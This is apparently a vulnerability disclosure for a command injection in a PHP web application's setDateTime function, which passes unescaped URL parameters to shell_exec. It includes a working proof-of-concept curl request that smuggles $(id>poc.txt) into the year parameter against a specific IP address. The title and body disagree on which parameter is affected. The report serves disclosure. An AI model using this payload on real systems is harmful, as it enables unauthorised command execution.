# `$day` parameter in the file `settingsregional.php ` has a Remote Command Injection

### Description

The  parameter **$year** in `setDataTime` function in the file `\usr\www\application\models\settingsregional.php`  has a Remote Command Injection vulnerablilty .

`\usr\www\application\models\settingsregional.php`

```php
public function setDateTime($year, $month, $day, $hour, $minute)
{
    shell_exec(sprintf('timedatectl set-time "%s-%s-%s %s:%s"',
        $year,
        $month,
        $day,
        $hour,
        $minute
    ));
}
```

### POC

```
curl -X POST "http://222.103.211.89:8004/settings/setDateTime/2005\$(id>poc.txt)/1/1/1/1" -H "Host: XXXXX"
```

### Example 

```
curl -X POST "http://222.103.211.89:8004/settings/setDateTime/2005\$(id>poc.txt)/1/1/1/1" -H "Host: 222.103.211.89:8004"
```



![image-20250506235345669](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505062353735.png)

![image-20250317212504659](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202503172125734.png)